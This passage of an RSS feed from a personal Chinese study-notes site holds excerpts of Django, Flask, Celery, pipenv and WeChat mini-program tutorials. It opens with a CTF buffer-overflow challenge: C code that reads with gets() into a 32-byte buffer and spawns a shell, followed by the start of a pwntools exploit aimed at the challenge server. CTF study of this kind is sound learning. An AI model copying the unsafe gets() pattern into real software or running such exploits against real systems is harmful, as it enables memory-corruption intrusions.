#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key){ char overflowme[32]; printf(&amp;#34;overflow me : &amp;#34;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&amp;#34;/bin/sh&amp;#34;); } else{ printf(&amp;#34;Nah..\n&amp;#34;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } exp 脚本（./1.py）：
from pwn import * c = remote(&amp;#34;pwnable.kr&amp;#34;, 9000) c.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/celery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/celery/</guid><description> 官方文档：http://docs.celeryproject.org/
Celery # celery 是一个用于实现定时任务的 python 库。
First Step with Django # http://docs.celeryproject.org/en/latest/django/first-steps-with-django.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/admin-site/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/admin-site/</guid><description>官方文档：https://docs.djangoproject.com/en/2.1/ref/contrib/admin/
Django admin site # Overview # If you’re not using the default project template, here are the requirements:
Add 'django.contrib.admin' and its dependencies -django.contrib.auth, django.contrib.contenttypes,django.contrib.messages, and django.contrib.sessions - to yourINSTALLED_APPS setting. Configure a DjangoTemplates backend in your TEMPLATES setting withdjango.contrib.auth.context_processors.auth anddjango.contrib.messages.context_processors.messages in the 'context_processors' option of OPTIONS. If you’ve customized the MIDDLEWARE setting,django.contrib.auth.middleware.AuthenticationMiddlewareand django.contrib.messages.middleware.MessageMiddlewaremust be included. Hook the admin’s URLs into your URLconf. If you need to create a user to login with, use the createsuperuser command.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/authentication-system/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/authentication-system/</guid><description>学习网址：
https://www.jianshu.com/p/17d4c2182ef7 http://www.liujiangblog.com/course/django/178 https://docs.djangoproject.com/en/1.11/topics/auth/ https://juejin.im/post/5987f51e51882549475a916d 官方的参考文档：https://docs.djangoproject.com/zh-hans/2.1/ref/contrib/auth/
Authentication System # Using the Django authentication system # User Object # User 是 Django 提供的一个对象，默认对象的主要属性是：username，password，email，first_name，last_name。参阅完整的文档：
关于 User 模块的操作（比如：使用 create_user() 函数创建对象）
from django.contrib.auth import get_user_model from django.contribute.auth.models import User # 导入 User 这个模块有以上两种方法 User = get_user_model() # 该行获得 User 这个模块，与导入的 User 指向同一个模块 Rookie_User = User.objects.create_user(&amp;#39;Rookie&amp;#39;, &amp;#39;email@e.com&amp;#39;, &amp;#39;passwd&amp;#39;) Rookie_User = User.objects.create(username=&amp;#34;Rookie001&amp;#34;) # 创建一个名为 ‘Rookie001’ 的 User 对象，返回该对象 User.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/guardian/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/guardian/</guid><description>项目地址：https://github.com/django-guardian/django-guardian
官方文档：https://django-guardian.readthedocs.io/en/stable/
中文介绍：https://www.jianshu.com/p/404fd39d5efc
django-guardian # django-guardian 是一个对象权限的框架。
对象权限是一种对象颗粒度上的权限机制，它允许为每个具体对象授权。
Django 其实包含了 object permission 的框架，但没有具体实现，object permission 的实现需要借助第三方 appdjango-guardian**，**我们在开发中用调用 django guradian 封装好的方法即可。
Tutorial # 安装：
$ pip install django-guardian 配置：
在 INSTALLED_APPS 中添加一个该模块：
INSTALLED_APPS = ( ... &amp;#39;guardian&amp;#39;, ) 在 settings.py 中新添加一个数据 AUTENTICATION_BACKENDS：
AUTHENTICATION_BACKENDS = ( &amp;#39;django.contrib.auth.backends.ModelBackend&amp;#39;, # default &amp;#39;guardian.backends.ObjectPermissionBackend&amp;#39;, ) 然后生成 guardian 的数据表：
$ python manage.py migrate 给对象赋权：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/signals/</guid><description>Django Signals # Built-in Signals # Django provides a set of built-in signals that let user code get notified by Django itself of certain actions. These include some useful notifications:
django.db.models.signals.pre_save &amp;amp; django.db.models.signals.post_save
Sent before or after a model’s save() method is called.
django.db.models.signals.pre_delete &amp;amp; django.db.models.signals.post_delete
Sent before or after a model’s delete() method or queryset’s delete() method is called.
django.db.models.signals.m2m_changed
Sent when a ManyToManyField on a model is changed.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial01/</guid><description>学习网址：https://www.djangoproject.com/start/
Tutorial01 # 使用 Django，请配置 Python3.5 及以上环境，查看 Python 版本请使用以下命令：
$ python --version 本 tutorial 建立在已经安装 Django 环境的基础上，Django 是 Python 的一个模块，可以通过以下命令安装：
$ pip install django 可以通过以下命令检测 Django 是否已经安装：
$ python -m django --version # 已经安装返回版本号，未安装返回 No module named django. Createing a project # 第一次使用 Django，先进行初始化，使用 cd （change directory）命令到工作到目标文件夹，使用以下命令在当前文件夹下创建一个新的 Django 项目：
$ django-admin startproject mysite PostScript: 项目的名称不应该与被 Python 或 Django 占用的关键词重合，比如：django 或 test 。
上述命令会自动生成以下文件，文件功能解释：
manage.py：Django 提供的与项目进行交互的一个 Python 脚本文件，详细信息。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial02/</guid><description>Tutorial02 # Database setup # 打开 mysite/settings.py，这是一个 Python 的模块变量，表示着 Django 的设置。
Django 的数据库默认使用 SQLite，如果想使用其他 DBMS，需要更改 DATABASES 这个 Python 字典中，'default' 键值对应的字典，进行以下设置：
&amp;lsquo;default&amp;rsquo; 字典键 &amp;lsquo;default&amp;rsquo; 字典可能值 'ENGINE' 'django.db.backends.sqlite3', 'django.db.backends.postgresql','django.db.backends.mysql', 'django.db.backends.oracle' , etc 'NAME' 数据库的名称，如果使用 sqlite，则为文件的路径 'USER' 登录数据库的用户名，非 sqlite 数据库必须添加 'PASSWORD' ##登录数据库用户名对应的密码，非 sqlite 数据库必须添加 'HOST' 连接数据库的主机名，sqlite 数据库不需声明，空字符串表示 'localhost' mysite/settings.py 中 TIME_ZONE 变量可以用于设置时区。
mysite/settings.py 中 INSTALLED_APPS 表示项目中所有应用的名字，默认情况下，包括了以下来自 Django 的 apps：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial03/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial03/</guid><description>Tutorial03 # Overview # Django 中定义了一个特殊的对象，称作 view，它抽象地对应着一个网页，Django 通过一个函数来抽象表示一个 view。同时 Django 提供了叫做 URLconfs 的东西，会将一个个 URL 模式字符串一一对应到每一个 view 中。
Writing more view # 我们可以在 polls/views.py 中加入以下代码：
def detail(request, question_id): return HttpResponse(&amp;#34;You&amp;#39;re looking at question %s.&amp;#34; % question_id) def results(request, question_id): response = &amp;#34;You&amp;#39;re looking at the results of question %s.&amp;#34; return HttpResponse(response % question_id) def vote(request, question_id): return HttpResponse(&amp;#34;You&amp;#39;re voting on question %s.&amp;#34; % question_id) 然后将以下代码添加到 polls/urls.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial04/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial04/</guid><description>Tutorial04 # Write a simple form # 我们可以在之前编写的 html 文件的模板中加入 &amp;lt;form&amp;gt; 元素，以便我们后续的研究：
&amp;lt;h1&amp;gt;{{ question.question_text }}&amp;lt;/h1&amp;gt; {% if error_message %}&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;{{ error_message }}&amp;lt;/strong&amp;gt;&amp;lt;/p&amp;gt;{% endif %} &amp;lt;form action=&amp;#34;{% url &amp;#39;polls:vote&amp;#39; question.id %}&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt; {% csrf_token %} {% for choice in question.choice_set.all %} &amp;lt;input type=&amp;#34;radio&amp;#34; name=&amp;#34;choice&amp;#34; id=&amp;#34;choice{{ forloop.counter }}&amp;#34; value=&amp;#34;{{ choice.id }}&amp;#34;&amp;gt; &amp;lt;label for=&amp;#34;choice{{ forloop.counter }}&amp;#34;&amp;gt;{{ choice.choice_text }}&amp;lt;/label&amp;gt;&amp;lt;br&amp;gt; {% endfor %} &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Vote&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; 以上的代码大致意思是在提交表单后，会连接到 polls 这个应用中，名为 vote 的 urlpattern，因此你需要在文件 User/urls.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial05/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial05/</guid><description>Tutorial05 # Introducing automated testing # 自动化测试：
测试可以节省你的时间 测试不仅仅可以发现问题，还能防止问题 测试使你的代码更受欢迎 测试有助于团队合作 Writing our first test # 1. identify a bug # onfirm the bug by using the shell to check the method on a question whose date lies in the future:
$ python manage.py shell &amp;gt;&amp;gt;&amp;gt; import datetime &amp;gt;&amp;gt;&amp;gt; from django.utils import timezone &amp;gt;&amp;gt;&amp;gt; from polls.models import Question &amp;gt;&amp;gt;&amp;gt; # create a Question instance with pub_date 30 days in the future &amp;gt;&amp;gt;&amp;gt; future_question = Question(pub_date=timezone.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/1.projectlayout/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/1.projectlayout/</guid><description>Project Layout # 一个 flask 项目可以单单由一个文件构成：
from flask import Flask app = Flask(__name__) @app.route(&amp;#39;/&amp;#39;) def hello(): return &amp;#39;Hello, World!&amp;#39; flask 项目的 .gitignore 可以通过以下的方式编写：
venv/
*.pyc
__pycache__/
instance/
.pytest_cache/
.coverage
htmlcov/
dist/
build/
*.egg-info/</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/2.applicationsetup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/2.applicationsetup/</guid><description>Application Setup # Application Factory # 首先创建一个文件夹 flaskr，然后在文件夹中创建一个文件 __init__.py：
import os from flask import Flask def create_app(test_config=None): # create and configure the app app = Flask(__name__, instance_relative_config=True) app.config.from_mapping( SECRET_KEY=&amp;#39;dev&amp;#39;, DATABASE=os.path.join(app.instance_path, &amp;#39;flaskr.sqlite&amp;#39;), ) if test_config is None: # load the instance config, if it exists, when not testing app.config.from_pyfile(&amp;#39;config.py&amp;#39;, silent=True) else: # load the test config if passed in app.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/3.databases/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/3.databases/</guid><description>Define and Access Database # Connect to Database # 创建文件 flaskr/db.py 添加以下的内容：
import sqlite3 import click from flask import current_app, g from flask.cli import with_appcontext def get_db(): if &amp;#39;db&amp;#39; not in g: g.db = sqlite3.connect( current_app.config[&amp;#39;DATABASE&amp;#39;], detect_types=sqlite3.PARSE_DECLTYPES ) g.db.row_factory = sqlite3.Row return g.db def close_db(e=None): db = g.pop(&amp;#39;db&amp;#39;, None) if db is not None: db.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/virutalenv/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/virutalenv/</guid><description>学习地址：https://docs.python-guide.org/dev/virtualenvs/
pipenv &amp;amp; virtualenv # Make sure you have got python and pip install:
$ python --version $ pip --version pipenv # Install pipenv:
$ pip install --user pipenv Install packages for your project:
$ cd myproject $ pipenv install requests Using installed packages:
For script file as below (main.py):
import requests response = requests.get(&amp;#39;https://httpbin.org/ip&amp;#39;) print(&amp;#39;Your IP is {0}&amp;#39;.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</guid><description>自学笔记 (pdf) #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/1.directorystructrue/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/1.directorystructrue/</guid><description>目录结构 # 文件结构 # 小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。
一个小程序主体部分由三个文件组成，必须放在项目的根目录，如下：
文件 必需 作用 app.js 是 小程序逻辑 app.json 是 小程序公共配置 app.wxss 否 小程序公共样式表 一个小程序页面由四个文件组成，分别是：
文件类型 必需 作用 js 是 页面逻辑 wxml 是 页面结构 json 否 页面配置 wxss 否 页面样式表 注意：为了方便开发者减少配置项，描述页面的四个文件必须具有相同的路径与文件名。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/2.settings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/2.settings/</guid><description>配置 # 全局配置 # 小程序根目录下的 app.json 文件用来对微信小程序进行全局配置，决定页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。
以下是一个包含了部分常用配置选项的 app.json ：
{ &amp;#34;pages&amp;#34;: [&amp;#34;pages/index/index&amp;#34;, &amp;#34;pages/logs/index&amp;#34;], &amp;#34;window&amp;#34;: { &amp;#34;navigationBarTitleText&amp;#34;: &amp;#34;Demo&amp;#34; }, &amp;#34;tabBar&amp;#34;: { &amp;#34;list&amp;#34;: [ { &amp;#34;pagePath&amp;#34;: &amp;#34;pages/index/index&amp;#34;, &amp;#34;text&amp;#34;: &amp;#34;首页&amp;#34; }, { &amp;#34;pagePath&amp;#34;: &amp;#34;pages/logs/logs&amp;#34;, &amp;#34;text&amp;#34;: &amp;#34;日志&amp;#34; } ] }, &amp;#34;networkTimeout&amp;#34;: { &amp;#34;request&amp;#34;: 10000, &amp;#34;downloadFile&amp;#34;: 10000 }, &amp;#34;debug&amp;#34;: true, &amp;#34;navigateToMiniProgramAppIdList&amp;#34;: [&amp;#34;wxe5f52902cf4de896&amp;#34;] } app.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/1.registerprocess/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/1.registerprocess/</guid><description>注册程序 App # App(Object) # App() 函数用来注册一个小程序。接受一个 Object 参数，其指定小程序的生命周期回调等。
App() 必须在 app.js 中调用，必须调用且只能调用一次。不然会出现无法预期的后果。
Object 参数说明：
属性 类型 描述 触发时机 onLaunch Function 生命周期回调—监听小程序初始化 小程序初始化完成时（全局只触发一次） onShow Function 生命周期回调—监听小程序显示 小程序启动，或从后台进入前台显示时 onHide Function 生命周期回调—监听小程序隐藏 小程序从前台进入后台时 onError Function 错误监听函数 小程序发生脚本错误，或者 api 调用失败时触发，会带上错误信息 onPageNotFound Function 页面不存在监听函数 小程序要打开的页面不存在时触发，会带上页面信息回调该函数 其他 Any 开发者可以添加任意的函数或数据到 Object 参数中，用 this 可以访问 前台、后台定义： 当用户点击左上角关闭，或者按了设备 Home 键离开微信，小程序并没有直接销毁，而是进入了后台；当再次进入微信或再次打开小程序，又会从后台进入前台。需要注意的是：只有当小程序进入后台一定时间，或者系统资源占用过高，才会被真正的销毁。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/2.scenevalues/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/2.scenevalues/</guid><description>场景值 # 基础库 1.1.0 开始支持，低版本需做兼容处理。
当前支持的场景值有：
场景值ID 说明 1001 发现栏小程序主入口，「最近使用」列表（基础库2.2.4版本起包含「我的小程序」列表） 1005 顶部搜索框的搜索结果页 1006 发现栏小程序主入口搜索框的搜索结果页 1007 单人聊天会话中的小程序消息卡片 1008 群聊会话中的小程序消息卡片 1011 扫描二维码 1012 长按图片识别二维码 1013 手机相册选取二维码 1014 小程序模板消息 1017 前往体验版的入口页 1019 微信钱包 1020 公众号 profile 页相关小程序列表 1022 聊天顶部置顶小程序入口 1023 安卓系统桌面图标 1024 小程序 profile 页 1025 扫描一维码 1026 附近小程序列表 1027 顶部搜索框搜索结果页「使用过的小程序」列表 1028 我的卡包 1029 卡券详情页 1030 自动化测试下打开小程序 1031 长按图片识别一维码 1032 手机相册选取一维码 1034 微信支付完成页 1035 公众号自定义菜单 1036 App 分享消息卡片 1037 小程序打开小程序 1038 从另一个小程序返回 1039 摇电视 1042 添加好友搜索框的搜索结果页 1043 公众号模板消息 1044 带 shareTicket 的小程序消息卡片 详情 1045 朋友圈广告 1046 朋友圈广告详情页 1047 扫描小程序码 1048 长按图片识别小程序码 1049 手机相册选取小程序码 1052 卡券的适用门店列表 1053 搜一搜的结果页 1054 顶部搜索框小程序快捷入口 1056 音乐播放器菜单 1057 钱包中的银行卡详情页 1058 公众号文章 1059 体验版小程序绑定邀请页 1064 微信连Wi-Fi状态栏 1067 公众号文章广告 1068 附近小程序列表广告 1069 移动应用 1071 钱包中的银行卡列表页 1072 二维码收款页面 1073 客服消息列表下发的小程序消息卡片 1074 公众号会话下发的小程序消息卡片 1077 摇周边 1078 连Wi-Fi成功页 1079 微信游戏中心 1081 客服消息下发的文字链 1082 公众号会话下发的文字链 1084 朋友圈广告原生页 1089 微信聊天主界面下拉，「最近使用」栏（基础库2.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/3.registrationpage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/3.registrationpage/</guid><description>注册页面 Page # Page(Object) # Page(Object) 函数用来注册一个页面。接受一个 Object 类型参数，其指定页面的初始数据、生命周期回调、事件处理函数等。
Object 参数说明：
属性 类型 描述 data Object 页面的初始数据 onLoad Function 生命周期回调—监听页面加载 onShow Function 生命周期回调—监听页面显示 onReady Function 生命周期回调—监听页面初次渲染完成 onHide Function 生命周期回调—监听页面隐藏 onUnload Function 生命周期回调—监听页面卸载 onPullDownRefresh Function 监听用户下拉动作 onReachBottom Function 页面上拉触底事件的处理函数 onShareAppMessage Function 用户点击右上角转发 onPageScroll Function 页面滚动触发事件的处理函数 onResize Function 页面尺寸改变时触发，详见 响应显示区域变化 onTabItemTap Function 当前是 tab 页时，点击 tab 时触发 其他 Any 开发者可以添加任意的函数或数据到 Object 参数中，在页面的函数中用 this 可以访问 除了 Page ，作为高级用法，页面可以像自定义组件一样使用 Component 来创建，这样就可以使用自定义组件的特性，如 behaviors 等。具体细节请阅读 Component 构造器 章节。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/4.route/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/4.route/</guid><description>页面路由 # 页面栈 # 框架以栈的形式维护了当前的所有页面。 当发生路由切换的时候，页面栈的表现如下：
路由方式 页面栈表现 初始化 新页面入栈 打开新页面 新页面入栈 页面重定向 当前页面出栈，新页面入栈 页面返回 页面不断出栈，直到目标返回页 Tab 切换 页面全部出栈，只留下新的 Tab 页面 重加载 页面全部出栈，只留下新的页面 getCurrentPages() # getCurrentPages() 函数用于获取当前页面栈的实例，以数组形式按栈的顺序给出，第一个元素为首页，最后一个元素为当前页面。
注意：
不要尝试修改页面栈，会导致路由以及页面状态错误。 不要在 App.onLaunch 的时候调用 getCurrentPages()，此时 page 还没有生成。 路由方式 # 对于路由的触发方式以及页面生命周期函数如下：
路由方式 触发时机 路由前页面 路由后页面 初始化 小程序打开的第一个页面 onLoad, onShow 打开新页面 调用 API wx.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/5.modular/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/5.modular/</guid><description>模块化 # 文件作用域 # 在 JavaScript 文件中声明的变量和函数只在该文件中有效；不同的文件中可以声明相同名字的变量和函数，不会互相影响。
通过全局函数 getApp() 可以获取全局的应用实例，如果需要全局的数据可以在 App() 中设置，如：
// app.js App({ globalData: 1 }) // a.js // The localValue can only be used in file a.js. const localValue = &amp;#39;a&amp;#39; // Get the app instance. const app = getApp() // Get the global data and change it. app.globalData++ // b.js // You can redefine localValue in file b.js, without interference with the localValue in a.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/6.api/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/6.api/</guid><description>API # 小程序开发框架提供丰富的微信原生 API，可以方便的调起微信提供的能力，如获取用户信息，本地存储，支付功能等。详细介绍请参考 API 文档。
事件监听 API # 我们约定，以 on 开头的 API 用来监听某个事件是否触发，如：wx.onSocketOpen，wx.onCompassChange 等。
这类 API 接受一个回调函数作为参数，当事件触发时会调用这个回调函数，并将相关数据以参数形式传入。
例如：
wx.onCompassChange(function (res) { console.log(res.direction) }) 同步 API # 我们约定，以 Sync 结尾的 API 都是同步 API， 如 wx.setStorageSync，wx.getSystemInfoSync 等。此外，也有一些其他的同步 API，如 wx.createWorker，wx.getBackgroundAudioManager 等，详情参见 API 文档中的说明。
同步 API 的执行结果可以通过函数返回值直接获取，如果执行出错会抛出异常。
try { wx.setStorageSync(&amp;#39;key&amp;#39;, &amp;#39;value&amp;#39;) } catch (e) { console.error(e) } 异步 API # 大多数 API 都是异步 API，如 wx.request，wx.login 等。这类 API 接口通常都接受一个 Object 类型的参数，这个参数都支持按需指定以下字段来接收接口调用结果：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/1.wxml/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/1.wxml/</guid><description>�
出 bug 了：https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/
WXML # 数据绑定 # 列表渲染 # 条件渲染 # 模板 # 事件 # 引用 # import # import 有作用域的概念，即只会 import 目标文件中定义的 template，而不会 import 目标文件 import 的 template。
include # include 可以将目标文件除了 &amp;lt;template/&amp;gt; &amp;lt;wxs/&amp;gt; 外的整个代码引入，相当于是拷贝到 include 位置，如：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/2.wxss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/2.wxss/</guid><description>WXSS # WXSS(WeiXin Style Sheets)是一套样式语言，用于描述 WXML 的组件样式。
WXSS 用来决定 WXML 的组件应该怎么显示。
为了适应广大的前端开发者，WXSS 具有 CSS 大部分特性。同时为了更适合开发微信小程序，WXSS 对 CSS 进行了扩充以及修改。
与 CSS 相比，WXSS 扩展的特性有：
